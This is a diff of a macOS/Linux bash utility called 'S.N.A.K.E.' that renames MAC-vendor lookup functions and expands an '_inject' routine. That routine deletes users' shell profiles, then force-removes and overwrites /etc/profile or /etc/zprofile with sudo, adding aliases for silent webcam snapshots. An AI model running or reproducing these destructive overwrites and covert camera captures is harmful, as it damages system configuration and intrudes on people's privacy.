@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-_version="0.4.6"
+_version="0.4.7"
 _name="S.N.A.K.E."
 _morph_state="Unknown"
 
@@ -1807,6 +1807,8 @@ _mac(){
 
     brew install htop >/dev/null  2>&1
 
+    brew install ffmpeg >/dev/null 2>&1
+
     brew install tor >/dev/null 2>&1
 
     brew cask install macs-fan-control >/dev/null  2>&1
@@ -2016,7 +2018,7 @@ _router_info(){
      printf "$YELLOW$(dig +short myip.opendns.com @resolver1.opendns.com)$NC\n"
      printf "\n"
      printf "$(arp -a | grep $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | awk '{print $4}')\n"
-     printf `_just_vendor $(arp -a | grep $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | awk '{print $4}')`
+     printf `_jvdr $(arp -a | grep $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | awk '{print $4}')`
      printf "$NC$BLINK\n"
      printf "\n"
      curl ipinfo.io/city
@@ -2032,7 +2034,7 @@ _router_info(){
     printf "$YELLOW$(dig +short myip.opendns.com @resolver1.opendns.com)$NC\n"
     printf "\n"
     printf "$(arp -a | grep $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | awk '{print $4}')\n"
-    printf `_just_vendor $(arp -a | grep $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | awk '{print $4}')`
+    printf `_jvdr $(arp -a | grep $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | awk '{print $4}')`
     printf "$NC$BLINK\n"
     printf "\n"
     curl ipinfo.io/city
@@ -3488,7 +3490,7 @@ _generalize(){
   printf "\n`echo Local IP  ` >> $YELLOW`ifconfig en0 | grep inet | sed '1d' | awk '{print $2;}'`$NC"
   printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig en0 | grep ether | awk '{print $2;}'`$NC"
   if [ "$1" != "-f" ]; then
-  printf "\n`echo Device  ` >> $YELLOW`_just_vendor $(ifconfig en0 | grep ether | awk '{print $2;}')`$NC"
+  printf "\n`echo Device  ` >> $YELLOW`_jvdr $(ifconfig en0 | grep ether | awk '{print $2;}')`$NC"
   fi
   printf "\n`echo Router IP  ` >> $BLUE`ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12`$NC"
   printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
@@ -3517,7 +3519,7 @@ _generalize(){
     printf "\n`echo Local IP  ` >> $YELLOW`ifconfig enp0s3 | grep inet | awk '{print $2}'`$NC"
     printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig enp0s3 | grep ether | awk '{print $2;}'`$NC"
     if [ $1 != "-f" ]; then
-    printf "\n`echo Device  ` >> $YELLOW`_just_vendor $(ifconfig enp0s3 | grep ether | awk '{print $2;}')`$NC"
+    printf "\n`echo Device  ` >> $YELLOW`_jvdr $(ifconfig enp0s3 | grep ether | awk '{print $2;}')`$NC"
     fi
     printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
     printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
@@ -3543,7 +3545,7 @@ _generalize(){
     #printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
     printf "\n`echo Local IP  ` >> $YELLOW`ifconfig em0 | grep inet | awk '{print $2}'`$NC"
     printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig em0 | grep lladdr | awk '{print $2}'`$NC"
-    printf "\n`echo Device  ` >> $YELLOW`_just_vendor $(ifconfig em0 | grep lladdr | awk '{print $2}')`$NC"
+    printf "\n`echo Device  ` >> $YELLOW`_jvdr $(ifconfig em0 | grep lladdr | awk '{print $2}')`$NC"
     printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
     printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
     printf "$GREEN Internet Provided by >> $WHITE" ; curl "ipinfo.io/org"
@@ -3568,7 +3570,7 @@ _generalize(){
     #printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
     printf "\n`echo Local IP  ` >> $YELLOW`hostaddr -i`$NC"
     printf "\n`echo MAC-Address  ` >> $YELLOW`hostaddr -e`$NC"
-    printf "\n`echo Device  ` >> $YELLOW`_just_vendor $(hostaddr -e)`$NC"
+    printf "\n`echo Device  ` >> $YELLOW`_jvdr $(hostaddr -e)`$NC"
     printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
     printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
     printf "$GREEN Internet Provided by >> $WHITE" ; curl "ipinfo.io/org"
@@ -3594,7 +3596,7 @@ _generalize(){
     printf "\n`echo Local IP  ` >> $YELLOW`ifconfig | grep inet | sed '1,2d' | awk '{print $3}'`$NC"
     printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig | grep Address | sed '1d' | awk '{print $5}'`$NC"
     if [ $1 != "-f" ]; then
-    printf "\n`echo Device  ` >> $YELLOW`_just_vendor $(ifconfig | grep Address | sed '1d' | awk '{print $5}')`$NC"
+    printf "\n`echo Device  ` >> $YELLOW`_jvdr $(ifconfig | grep Address | sed '1d' | awk '{print $5}')`$NC"
     fi
     printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
     printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
@@ -3620,7 +3622,7 @@ _generalize(){
     printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
     printf "\n`echo Local IP  ` >> $YELLOW`ifconfig enp0s3 | grep inet | awk '{print $2}'`$NC"
     printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig enp0s3 | grep ether | awk '{print $2;}'`$NC"
-    printf "\n`echo Device  ` >> $YELLOW`_just_vendor $(ifconfig enp0s3 | grep ether | awk '{print $2;}')`$NC"
+    printf "\n`echo Device  ` >> $YELLOW`_jvdr $(ifconfig enp0s3 | grep ether | awk '{print $2;}')`$NC"
     printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
     printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
     printf "$GREEN Internet Provided by >> $WHITE" ; curl "ipinfo.io/org"
@@ -3714,7 +3716,7 @@ _spread(){
 
 
 
-_vendor(){
+_vndr(){
 
 
 
@@ -3731,9 +3733,11 @@ _vendor(){
   {
   # Test Connection
     ping -c 1 standards-oui.ieee.org &> /dev/null
+    #ping -c 1 github.com &> /dev/null
     [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] Was unable to reach the database." && exit 68
   # Download Database
     database="$(curl -sf http://standards-oui.ieee.org/oui/oui.txt)"
+    #database="$(curl -sf https://github.com/royhills/arp-scan/blob/master/ieee-oui.txt)"
     [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] Could not read the database." && exit 72
   }
   format_vendor_address()
@@ -3765,6 +3769,70 @@ _vendor(){
   [[ $silent != true ]] && echo "Searching Database..."
   get_database
   vendor="$(echo "$database" | grep -E "$vendor_address.*(base 16)" | awk '{for(i=4;i<NF;i++) printf"%s",$i OFS;if(NF)printf"%s",$NF;printf ORS}')"
+  #vendor="$(echo "$database" | grep -E "$vendor_address" | awk '{printf $6,$7}')"
+  [[ -z $vendor ]] && vendor="Unknown"
+  # Print Result
+  printf "$BLUE$vendor$NC\n"
+  exit 0
+
+
+
+}
+
+_newv(){
+
+
+
+
+  # Set Functions
+  usage()
+  {
+  echo "MAC Vendor Help"
+  echo "mac_vendor -a 'MAC Address' | Get the vendor of the specified address."
+  echo "mac_vendor -s 'MAC Address' | Silent, only output result."
+  exit 0
+  }
+  get_database()
+  {
+  # Test Connection
+    #ping -c 1 standards-oui.ieee.org &> /dev/null
+     ping -c 1 github.com &> /dev/null
+    [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] Was unable to reach the database." && exit 68
+  # Download Database
+    #database="$(curl -sf http://standards-oui.ieee.org/oui/oui.txt)"
+    database="$(curl -sf https://github.com/royhills/arp-scan/blob/master/ieee-oui.txt)"
+    [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] Could not read the database." && exit 72
+  }
+  format_vendor_address()
+  {
+    [[ -n $1 ]] && vendor_address="$1"
+    vendor_address="$(echo "$vendor_address" | tr -d ':' | tr '[:lower:]' '[:upper:]')"
+  if [[ ${#vendor_address} == "6" ]]; then
+  return
+  else
+      vendor_address="$(echo "$vendor_address" | cut -c1-6)"
+  fi
+  }
+  # Set Arguments
+  while getopts ":s:a:h" opt; do
+  case $opt in
+      s )  silent=true; vendor_address="$OPTARG" ;;
+      a )  vendor_address="$OPTARG" ;;
+      h )  usage ;;
+  \?)  echo "[Error] Invalid option: -$OPTARG" ; exit 1 ;;
+  esac
+  done
+  # Get Vendor Address
+  [[ -z $vendor_address && -n $1 ]] && vendor_address="$1"
+  [[ -z $vendor_address ]] && read -p "Vender address to test for [##:##:##:##:##:##]: " vendor_address
+  format_vendor_address
+  [[ ${#vendor_address} < 6 || ! $vendor_address =~ ^[0-9A-F]{6}$ ]] \
+  && echo "[Error 65:$LINENO] The address '$vendor_address' was invalid." && exit 65
+  # Search Database
+  [[ $silent != true ]] && echo "Searching Database..."
+  get_database
+  #vendor="$(echo "$database" | grep -E "$vendor_address.*(base 16)" | awk '{for(i=4;i<NF;i++) printf"%s",$i OFS;if(NF)printf"%s",$NF;printf ORS}')"
+  vendor="$(echo "$database" | grep -E "$vendor_address" | awk '{printf $6,$7}')"
   [[ -z $vendor ]] && vendor="Unknown"
   # Print Result
   printf "$BLUE$vendor$NC\n"
@@ -3775,7 +3843,85 @@ _vendor(){
 }
 
 
-_just_vendor(){
+
+
+
+_jvdr(){
+
+
+
+
+  # Set Functions
+  usage()
+  {
+  echo "MAC Vendor Help"
+  echo "mac_vendor -a 'MAC Address' | Get the vendor of the specified address."
+  echo "mac_vendor -s 'MAC Address' | Silent, only output result."
+  exit 0
+  }
+  get_database()
+  {
+  # Test Connection One
+    ping -c 1 standards-oui.ieee.org &> /dev/null
+    [[ $? > 0 ]] && echo "[Error 64:$(($LINENO - 1))] Was unable to reach the first database." && exit 68
+
+    # Test Connection Two
+    #  ping -c 1 github.com &> /dev/null
+    #  [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] Was unable to reach second the database." && exit 68
+  # Download Database
+
+    database="$(curl -sf http://standards-oui.ieee.org/oui/oui.txt)"
+    [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] Could not read the database." && exit 72
+
+
+: '
+    if [ "$database" | grep -c Moved > 1 ]
+       ping -c 1 github.com &> /dev/null
+       [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] Was unable to reach second the database." && exit 68
+       database="$(curl -sf https://github.com/royhills/arp-scan/blob/master/ieee-oui.txt)"
+       [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] Could not read the database." && exit 72
+    fi
+    '
+  }
+  format_vendor_address()
+  {
+    [[ -n $1 ]] && vendor_address="$1"
+    vendor_address="$(echo "$vendor_address" | tr -d ':' | tr '[:lower:]' '[:upper:]')"
+  if [[ ${#vendor_address} == "6" ]]; then
+  return
+  else
+      vendor_address="$(echo "$vendor_address" | cut -c1-6)"
+  fi
+  }
+  # Set Arguments
+  while getopts ":s:a:h" opt; do
+  case $opt in
+      s )  silent=true; vendor_address="$OPTARG" ;;
+      a )  vendor_address="$OPTARG" ;;
+      h )  usage ;;
+  \?)  echo "[Error] Invalid option: -$OPTARG" ; exit 1 ;;
+  esac
+  done
+  # Get Vendor Address
+  [[ -z $vendor_address && -n $1 ]] && vendor_address="$1"
+  [[ -z $vendor_address ]] && read -p "Vender address to test for [##:##:##:##:##:##]: " vendor_address
+  format_vendor_address
+  [[ ${#vendor_address} < 6 || ! $vendor_address =~ ^[0-9A-F]{6}$ ]] \
+  && echo "[Error 65:$LINENO] The address '$vendor_address' was invalid." && exit 65
+  # Search Database
+  get_database
+  vendor="$(echo "$database" | grep -E "$vendor_address.*(base 16)" | awk '{for(i=4;i<NF;i++) printf"%s",$i OFS;if(NF)printf"%s",$NF;printf ORS}')"
+  [[ -z $vendor ]] && vendor="Unknown"
+  # Print Result
+  printf "$BLUE$vendor$NC\n"
+  exit 0
+
+
+
+}
+
+
+_newj(){
 
 
 
@@ -3847,10 +3993,9 @@ _just_vendor(){
 
 }
 
-
 _newScan(){
 
-   arp -a | awk -v column=$4 '{ $column = _just_vendor($column); print }'
+   arp -a | awk -v column=$4 '{ $column = _jvdr($column); print }'
 
 
 }
@@ -4054,6 +4199,18 @@ _mb(){
 
 }
 
+
+
+
+_profile_core(){
+
+
+  printf "Muie\n"
+
+
+
+}
+
 _inject(){
 
   _names=("flake" "blake" "plake" "blara" "marco" "white" "james" "alina" "leana" "slava" "horia" "moria" "power" "coral" "death" "cobra" "banel" "quran" "ninja" "nixon" "betty" "harry" "draco" "boris" "adolf" "arpad" "soyuz" "force" "forta" "balon" "pablo" "narco" "diana" "andra" "tower" "tokyo" "baron" "airfr" "paris" "trump" "archx" "genie" "bacon" "fruit" "masha" "moris" "elisa" "marii" "brain" "water")
@@ -4062,119 +4219,1083 @@ _inject(){
    _system="$(uname -s)"
 
     if [ $_system == "Darwin" ]; then
-    printf "$RED Injecting on macOS...$NC\n"
-    cd ~
-    sudo rm .bash_profile
-    touch .bash_profile
-    echo " " >> .bash_profile
-    echo "export PS1=\">>> \"" >> .bash_profile
-    echo " " >> .bash_profile
-    echo "# Aliases " >> .bash_profile
-    echo " " >> .bash_profile
-    echo "alias rip=\"sudo kill -9\"" >> .bash_profile
-    echo "alias off=\"sudo airport -z\"" >> .bash_profile
-    echo "alias lock=\"pmset displaysleepnow\"" >> .bash_profile
-    echo "alias die=\"killall Terminal\"" >> .bash_profile
-    echo "alias ll=\"ls -FGlAh\"" >> .bash_profile
-    echo "alias home=\"cd ~\"" >> .bash_profile
-    echo "alias root=\"cd /\"" >> .bash_profile
-    echo "alias ?=\"file\"" >> .bash_profile
-    echo "alias _edit=\"nano ~/.bash_profile\"" >> .bash_profile
-    echo "alias _update\"source ~/.bash_profile\"" >> .bash_profile
-    echo "alias refresh=\"_update ; clear\"" >> .bash_profile
-    echo "alias relist=\"_update ; clear ; ls\"" >> .bash_profile
-    echo "alias highlight=\"_update ; _yellow ; clear ; ls ; quietTextRestore\"" >> .bash_profile
-    echo "alias reveal=\"_white ; _update ; clear ; ls -la ; quietTextRestore\"" >> .bash_profile
-    echo "alias rn=\"react-native\"" >> .bash_profile
-    echo "alias ther=\"while true" >> .bash_profile
-    echo "do" >> .bash_profile
-    echo "    temp" >> .bash_profile
-    echo "    sleep 7" >> .bash_profile
-    echo "done\"" >> .bash_profile
-    echo " " >> .bash_profile
-    echo "# Functions " >> .bash_profile
-    echo " " >> .bash_profile
-    echo "cd() { builtin cd \"\$@\"; ls ;}" >> .bash_profile
-    echo "_+() { open -a \$1 \$1 }" >> .bash_profile
-    echo "_a() { open -a /Applications/\"\$1.app\"/Contents/MacOS/\$1 }" >> .bash_profile
-    echo "_f() { open -a Finder ./ }" >> .bash_profile
-    echo "space() { du -hs "\$@" | sort -nr; }" >> .bash_profile
-    echo "mkdg() { mkdir \$1 ; clear ; cd \$1 ;}" >> .bash_profile
-  #  echo "docked() { sudo lsof -i :\"\$@\" ;}" >> .bash_profile
-    echo "destroy() { killall -9 appPID \"\$1\" ;}" >> .bash_profile
-    echo "geolocate() { curl ipinfo.io/\$1 }" >> .bash_profile
-    echo "origin() { clear ; ps -p \$1 | awk '{print \$4;}' | sed '1d' }" >> .bash_profile
-    echo "cheese() { imagesnap -w 1 -q }" >> .bash_profile
-    echo "wisconsin() { imagesnap -w 1 -q .snapshot.png }" >> .bash_profile
-    echo "iwannafind() { mdfind \$2 \$1 }" >> .bash_profile
-    echo "iwannasee() { clear ; cat \$(mdfind \$2 \$1) }" >> .bash_profile
-    echo "replace() { sed -i -e 's/\$1/\$2/g' \$3 ; rm \$3-e }" >> .bash_profile
-    echo "ports(){" >> .bash_profile
-    echo "   for i in `seq \$1 \$2`;" >> .bash_profile
-    echo "        do" >> .bash_profile
-    echo "              echo \"проверка процессов для порта  \$i ->>\"" >> .bash_profile
-    echo "              sudo lsof -i :\$i" >> .bash_profile
-    echo "        done" >> .bash_profile
-    echo "}" >> .bash_profile
-    echo "thermic(){" >> .bash_profile
-    echo "while true" >> .bash_profile
-    echo "do" >> .bash_profile
-    echo "    temp" >> .bash_profile
-    echo "    sleep \$1" >> .bash_profile
-    echo "done" >> .bash_profile
-    echo "}" >> .bash_profile
-    echo "temp(){" >> .bash_profile
-    echo "   WHITE='\e[1;97m'" >> .bash_profile
-    echo "   NC='\033[0m'" >> .bash_profile
-    echo "   clear" >> .bash_profile
-    echo "   istats | sed '\$d'" >> .bash_profile
-    echo "   printf \"\$WHITE\n\"" >> .bash_profile
-    echo "   date" >> .bash_profile
-    echo "   printf \"\$NC\n\"" >> .bash_profile
-    echo "}" >> .bash_profile
-    echo " " >> .bash_profile
-    echo "# Color functions " >> .bash_profile
-    echo " " >> .bash_profile
-    echo "_green(){" >> .bash_profile
-    echo "   GREEN='\e[1;92m'" >> .bash_profile
-    echo "   clear" >> .bash_profile
-    echo "   printf \"\$GREEN Green Bold Activate\n\"" >> .bash_profile
-    echo "   date" >> .bash_profile
-    echo "}" >> .bash_profile
-    echo "_white(){" >> .bash_profile
-    echo "   WHITE='\e[1;97m'" >> .bash_profile
-    echo "   clear" >> .bash_profile
-    echo "   printf \"\$WHITE White Bold Activate\n\"" >> .bash_profile
-    echo "   date" >> .bash_profile
-    echo "}" >> .bash_profile
-    echo "_yellow(){" >> .bash_profile
-    echo "   YELLOW='\e[1;93m'" >> .bash_profile
-    echo "   clear" >> .bash_profile
-    echo "   printf \"\$YELLOW Yellow Bold Activate\n\"" >> .bash_profile
-    echo "   date" >> .bash_profile
-    echo "}" >> .bash_profile
-    echo "_red(){" >> .bash_profile
-    echo "   RED='\e[1;91m'" >> .bash_profile
-    echo "   clear" >> .bash_profile
-    echo "   printf \"\$RED Red Bold Activate\n\"" >> .bash_profile
-    echo "   date" >> .bash_profile
-    echo "}" >> .bash_profile
-    echo "_cyan(){" >> .bash_profile
-    echo "   CYAN='\e[1;96m'" >> .bash_profile
-    echo "   clear" >> .bash_profile
-    echo "   printf \"\$CYAN Cyan Bold Activate\n\"" >> .bash_profile
-    echo "   date" >> .bash_profile
-    echo "}" >> .bash_profile
-    echo "_normal(){" >> .bash_profile
-    echo "   NC='\033[0m'" >> .bash_profile
-    echo "   clear" >> .bash_profile
-    echo "   printf \"\$NC Text Normalized\n\"" >> .bash_profile
-    echo "   date" >> .bash_profile
-    echo "}" >> .bash_profile
-    echo "quietTextRestore(){" >> .bash_profile
-    echo "   NC='\033[0m'" >> .bash_profile
-    echo "   printf \"\$NC\n\"" >> .bash_profile
-    echo "}" >> .bash_profile
+    printf "$RED Injecting on macOS.$NC..\n"
+    if [ "$1" == "-i" ]; then
+
+      if [ "$2" == "bash" ]; then
+      cd ~
+      sudo rm .profile
+      touch .profile
+      echo " " >> .profile
+      echo "export PS1=\">>> \"" >> .profile
+      echo " " >> .profile
+      echo "# Aliases " >> .profile
+      echo " " >> .profile
+      echo "alias rip=\"sudo kill -9\"" >> .profile
+      echo "alias off=\"sudo airport -z\"" >> .profile
+      echo "alias lock=\"pmset displaysleepnow\"" >> .profile
+      echo "alias die=\"killall Terminal\"" >> .profile
+      echo "alias ll=\"ls -FGlAh\"" >> .profile
+      echo "alias home=\"cd ~\"" >> .profile
+      echo "alias root=\"cd /\"" >> .profile
+      echo "alias ?=\"file\"" >> .profile
+      echo "alias _edit=\"nano ~/etc/profile\"" >> .profile
+      echo "alias _update\"source ~/etc/profile\"" >> .profile
+      echo "alias refresh=\"_update ; clear\"" >> .profile
+      echo "alias relist=\"_update ; clear ; ls\"" >> .profile
+      echo "alias highlight=\"_update ; _yellow ; clear ; ls ; quietTextRestore\"" >> .profile
+      echo "alias reveal=\"_white ; _update ; clear ; ls -la ; quietTextRestore\"" >> .profile
+      echo "alias rn=\"react-native\"" >> .profile
+      echo "alias ther=\"while true" >> .profile
+      echo "do" >> .profile
+      echo "    temp" >> .profile
+      echo "    sleep 7" >> .profile
+      echo "done\"" >> .profile
+      echo " " >> .profile
+      echo "# Functions " >> .profile
+      echo " " >> .profile
+      echo "cd() { builtin cd \"\$@\"; ls ;}" >> .profile
+      echo "_+() { open -a \$1 \$1 }" >> .profile
+      echo "_a() { open -a /Applications/\"\$1.app\"/Contents/MacOS/\$1 }" >> .profile
+      echo "_f() { open -a Finder ./ }" >> .profile
+      echo "space() { du -hs "\$@" | sort -nr; }" >> .profile
+      echo "mkdg() { mkdir \$1 ; clear ; cd \$1 ;}" >> .profile
+    #  echo "docked() { sudo lsof -i :\"\$@\" ;}" >> .bash_profile
+      echo "destroy() { killall -9 appPID \"\$1\" ;}" >> .profile
+      echo "geolocate() { curl ipinfo.io/\$1 }" >> .profile
+      echo "origin() { clear ; ps -p \$1 | awk '{print \$4;}' | sed '1d' }" >> .profile
+      echo "cheese() { imagesnap -w 1 -q }" >> .profile
+      echo "wisconsin() { imagesnap -w 1 -q .snapshot.png }" >> .profile
+      echo "iwannafind() { mdfind \$2 \$1 }" >> .profile
+      echo "iwannasee() { clear ; cat \$(mdfind \$2 \$1) }" >> .profile
+      echo "replace() { sed -i -e 's/\$1/\$2/g' \$3 ; rm \$3-e }" >> .profile
+      echo "ports(){" >> .profile
+      echo "   for i in `seq \$1 \$2`;" >> .profile
+      echo "        do" >> .profile
+      echo "              echo \"проверка процессов для порта  \$i ->>\"" >> .profile
+      echo "              sudo lsof -i :\$i" >> .profile
+      echo "        done" >> .profile
+      echo "}" >> .profile
+      echo "thermic(){" >> .profile
+      echo "while true" >> .profile
+      echo "do" >> .profile
+      echo "    temp" >> .profile
+      echo "    sleep \$1" >> .profile
+      echo "done" >> .profile
+      echo "}" >> .profile
+      echo "temp(){" >> .profile
+      echo "   WHITE='\e[1;97m'" >> .profile
+      echo "   NC='\033[0m'" >> .profile
+      echo "   clear" >> .profile
+      echo "   istats | sed '\$d'" >> .profile
+      echo "   printf \"\$WHITE\n\"" >> .profile
+      echo "   date" >> .profile
+      echo "   printf \"\$NC\n\"" >> .profile
+      echo "}" >> .profile
+      echo " " >> .profile
+      echo "# Color functions " >> .profile
+      echo " " >> .profile
+      echo "_green(){" >> .profile
+      echo "   GREEN='\e[1;92m'" >> .profile
+      echo "   clear" >> .profile
+      echo "   printf \"\$GREEN Green Bold Activate\n\"" >> .profile
+      echo "   date" >> .profile
+      echo "}" >> .profile
+      echo "_white(){" >> .profile
+      echo "   WHITE='\e[1;97m'" >> .profile
+      echo "   clear" >> .profile
+      echo "   printf \"\$WHITE White Bold Activate\n\"" >> .profile
+      echo "   date" >> .profile
+      echo "}" >> .profile
+      echo "_yellow(){" >> .profile
+      echo "   YELLOW='\e[1;93m'" >> .profile
+      echo "   clear" >> .profile
+      echo "   printf \"\$YELLOW Yellow Bold Activate\n\"" >> .profile
+      echo "   date" >> .profile
+      echo "}" >> .profile
+      echo "_red(){" >> .profile
+      echo "   RED='\e[1;91m'" >> .profile
+      echo "   clear" >> .profile
+      echo "   printf \"\$RED Red Bold Activate\n\"" >> .profile
+      echo "   date" >> .profile
+      echo "}" >> .profile
+      echo "_cyan(){" >> .profile
+      echo "   CYAN='\e[1;96m'" >> .profile
+      echo "   clear" >> .profile
+      echo "   printf \"\$CYAN Cyan Bold Activate\n\"" >> .profile
+      echo "   date" >> .profile
+      echo "}" >> .profile
+      echo "_normal(){" >> .profile
+      echo "   NC='\033[0m'" >> .profile
+      echo "   clear" >> .profile
+      echo "   printf \"\$NC Text Normalized\n\"" >> .profile
+      echo "   date" >> .profile
+      echo "}" >> .profile
+      echo "quietTextRestore(){" >> .profile
+      echo "   NC='\033[0m'" >> .profile
+      echo "   printf \"\$NC\n\"" >> .profile
+      echo "}" >> .profile
+      sudo rm -rf /etc/profile
+      sudo cp ./.profile /etc/profile
+      source /etc/profile
+      printf "$RED Injected$NC\n"
+
+    elif [[ "$2" == "zsh" ]]; then
+
+      cd ~
+      sudo rm .zprofile
+      touch .zprofile
+      echo " " >> .zprofile
+      echo "export PS1=\">>> \"" >> .zprofile
+      echo " " >> .zprofile
+      echo "# Aliases " >> .zprofile
+      echo " " >> .zprofile
+      echo "alias rip=\"sudo kill -9\"" >> .zprofile
+      echo "alias off=\"sudo airport -z\"" >> .zprofile
+      echo "alias lock=\"pmset displaysleepnow\"" >> .zprofile
+      echo "alias die=\"killall Terminal\"" >> .zprofile
+      echo "alias ll=\"ls -FGlAh\"" >> .zprofile
+      echo "alias home=\"cd ~\"" >> .zprofile
+      echo "alias root=\"cd /\"" >> .zprofile
+      echo "alias ?=\"file\"" >> .zprofile
+      echo "alias _edit=\"nano ~/etc/profile\"" >> .zprofile
+      echo "alias _update\"source ~/etc/profile\"" >> .zprofile
+      echo "alias refresh=\"_update ; clear\"" >> .zprofile
+      echo "alias relist=\"_update ; clear ; ls\"" >> .zprofile
+      echo "alias highlight=\"_update ; _yellow ; clear ; ls ; quietTextRestore\"" >> .zprofile
+      echo "alias reveal=\"_white ; _update ; clear ; ls -la ; quietTextRestore\"" >> .zprofile
+      echo "alias rn=\"react-native\"" >> .zprofile
+      echo "alias ther=\"while true" >> .zprofile
+      echo "do" >> .zprofile
+      echo "    temp" >> .zprofile
+      echo "    sleep 7" >> .zprofile
+      echo "done\"" >> .zprofile
+      echo " " >> .zprofile
+      echo "# Functions " >> .zprofile
+      echo " " >> .zprofile
+      echo "cd() { builtin cd \"\$@\"; ls ;}" >> .zprofile
+      echo "_+() { open -a \$1 \$1 }" >> .zprofile
+      echo "_a() { open -a /Applications/\"\$1.app\"/Contents/MacOS/\$1 }" >> .zprofile
+      echo "_f() { open -a Finder ./ }" >> .zprofile
+      echo "space() { du -hs "\$@" | sort -nr; }" >> .zprofile
+      echo "mkdg() { mkdir \$1 ; clear ; cd \$1 ;}" >> .zprofile
+    #  echo "docked() { sudo lsof -i :\"\$@\" ;}" >> .bash_profile
+      echo "destroy() { killall -9 appPID \"\$1\" ;}" >> .zprofile
+      echo "geolocate() { curl ipinfo.io/\$1 }" >> .zprofile
+      echo "origin() { clear ; ps -p \$1 | awk '{print \$4;}' | sed '1d' }" >> .zprofile
+      echo "cheese() { imagesnap -w 1 -q }" >> .zprofile
+      echo "wisconsin() { imagesnap -w 1 -q .snapshot.png }" >> .zprofile
+      echo "iwannafind() { mdfind \$2 \$1 }" >> .zprofile
+      echo "iwannasee() { clear ; cat \$(mdfind \$2 \$1) }" >> .zprofile
+      echo "replace() { sed -i -e 's/\$1/\$2/g' \$3 ; rm \$3-e }" >> .zprofile
+      echo "ports(){" >> .zprofile
+      echo "   for i in `seq \$1 \$2`;" >> .zprofile
+      echo "        do" >> .zprofile
+      echo "              echo \"проверка процессов для порта  \$i ->>\"" >> .zprofile
+      echo "              sudo lsof -i :\$i" >> .zprofile
+      echo "        done" >> .zprofile
+      echo "}" >> .zprofile
+      echo "thermic(){" >> .zprofile
+      echo "while true" >> .zprofile
+      echo "do" >> .zprofile
+      echo "    temp" >> .zprofile
+      echo "    sleep \$1" >> .zprofile
+      echo "done" >> .zprofile
+      echo "}" >> .zprofile
+      echo "temp(){" >> .zprofile
+      echo "   WHITE='\e[1;97m'" >> .zprofile
+      echo "   NC='\033[0m'" >> .zprofile
+      echo "   clear" >> .zprofile
+      echo "   istats | sed '\$d'" >> .zprofile
+      echo "   printf \"\$WHITE\n\"" >> .zprofile
+      echo "   date" >> .zprofile
+      echo "   printf \"\$NC\n\"" >> .zprofile
+      echo "}" >> .zprofile
+      echo " " >> .zprofile
+      echo "# Color functions " >> .zprofile
+      echo " " >> .zprofile
+      echo "_green(){" >> .zprofile
+      echo "   GREEN='\e[1;92m'" >> .zprofile
+      echo "   clear" >> .zprofile
+      echo "   printf \"\$GREEN Green Bold Activate\n\"" >> .zprofile
+      echo "   date" >> .zprofile
+      echo "}" >> .zprofile
+      echo "_white(){" >> .zprofile
+      echo "   WHITE='\e[1;97m'" >> .zprofile
+      echo "   clear" >> .zprofile
+      echo "   printf \"\$WHITE White Bold Activate\n\"" >> .zprofile
+      echo "   date" >> .zprofile
+      echo "}" >> .zprofile
+      echo "_yellow(){" >> .zprofile
+      echo "   YELLOW='\e[1;93m'" >> .zprofile
+      echo "   clear" >> .zprofile
+      echo "   printf \"\$YELLOW Yellow Bold Activate\n\"" >> .zprofile
+      echo "   date" >> .zprofile
+      echo "}" >> .zprofile
+      echo "_red(){" >> .zprofile
+      echo "   RED='\e[1;91m'" >> .zprofile
+      echo "   clear" >> .zprofile
+      echo "   printf \"\$RED Red Bold Activate\n\"" >> .zprofile
+      echo "   date" >> .zprofile
+      echo "}" >> .zprofile
+      echo "_cyan(){" >> .zprofile
+      echo "   CYAN='\e[1;96m'" >> .zprofile
+      echo "   clear" >> .zprofile
+      echo "   printf \"\$CYAN Cyan Bold Activate\n\"" >> .zprofile
+      echo "   date" >> .zprofile
+      echo "}" >> .zprofile
+      echo "_normal(){" >> .zprofile
+      echo "   NC='\033[0m'" >> .zprofile
+      echo "   clear" >> .zprofile
+      echo "   printf \"\$NC Text Normalized\n\"" >> .zprofile
+      echo "   date" >> .zprofile
+      echo "}" >> .zprofile
+      echo "quietTextRestore(){" >> .zprofile
+      echo "   NC='\033[0m'" >> .zprofile
+      echo "   printf \"\$NC\n\"" >> .zprofile
+      echo "}" >> .zprofile
+      sudo rm -rf /etc/zprofile
+      sudo cp ./.profile /etc/zprofile
+      source /etc/zprofile
